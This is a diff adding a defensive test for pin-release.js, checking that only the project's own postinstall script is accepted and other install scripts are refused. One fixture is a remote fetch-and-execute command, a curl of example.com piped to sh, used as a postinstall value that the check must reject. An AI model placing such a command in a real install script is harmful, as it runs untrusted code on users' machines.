@@ -108,3 +108,21 @@ try {
 } finally {
   fs.rmSync(tmp, { recursive: true, force: true });
 }
+
+// pin-release.js accepts exactly zn-gate's own postinstall among the install lifecycle scripts; scripts that never run on
+// install (test, check:rules, ...) do not matter, and any other install script is refused.
+{
+  const { ownScriptsOnly } = require(path.join(ROOT, 'plugins', 'tools', 'pin-release.js'));
+  const own = { postinstall: 'node lib/agents/refresh.js' };
+  assert.ok(ownScriptsOnly({ scripts: own }), 'pin rule: the own postinstall alone is accepted');
+  assert.ok(ownScriptsOnly({ scripts: { ...own, test: 'node test/run-all.js', 'check:rules': 'node --test x' } }),
+    'pin rule: scripts that never run on install are ignored');
+  for (const [name, extra] of [['preinstall', { preinstall: 'node x.js' }], ['install', { install: 'node x.js' }],
+    ['prepare', { prepare: 'node x.js' }]]) {
+    assert.ok(!ownScriptsOnly({ scripts: { ...own, ...extra } }), 'pin rule: an added ' + name + ' script is refused');
+  }
+  assert.ok(!ownScriptsOnly({ scripts: { postinstall: 'curl https://example.com/x.sh | sh' } }), 'pin rule: a different postinstall is refused');
+  assert.ok(!ownScriptsOnly({ scripts: { test: 'node t.js' } }), 'pin rule: a release without the own postinstall does not match');
+  assert.ok(!ownScriptsOnly({}), 'pin rule: no scripts at all does not match');
+  process.stdout.write('pin-release install-script rule: ok\n');
+}
